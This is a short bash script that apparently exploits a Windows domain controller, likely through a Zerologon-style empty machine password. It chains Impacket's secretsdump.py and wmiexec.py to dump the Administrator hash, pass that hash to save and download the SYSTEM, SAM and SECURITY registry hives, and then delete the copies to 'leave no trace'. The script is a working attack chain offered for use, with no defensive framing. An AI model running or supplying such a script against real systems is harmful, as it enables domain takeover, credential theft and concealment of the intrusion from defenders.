#! /bin/bash

python3 set_empty_pw.py $2 $3
hashes=$(secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 "$1/$2"'$@'"$3" \
         | sed -nr 's/Administrator:[0-9]+:(.*:.*):::/\1/p')

# Save relevant device info
wmiexec.py -hashes $hashes "$1/Administrator@$3" "reg save HKLM\\SYSTEM system.save & reg save HKLM\\SAM sam.save & reg save HKLM\\SECURITY security.save"

# Download device info to machine
# Note: this needs to be done separately as lget is a wmiexec command, and not a windows one.
wmiexec.py -hashes $hashes "$1/Administrator@$3" "lget system.save"
wmiexec.py -hashes $hashes "$1/Administrator@$3" "lget sam.save"
wmiexec.py -hashes $hashes "$1/Administrator@$3" "lget security.save"

# Delete device info off target to leave no trace
wmiexec.py -hashes $hashes "$1/Administrator@$3" "del /f system.save sam.save security.save"

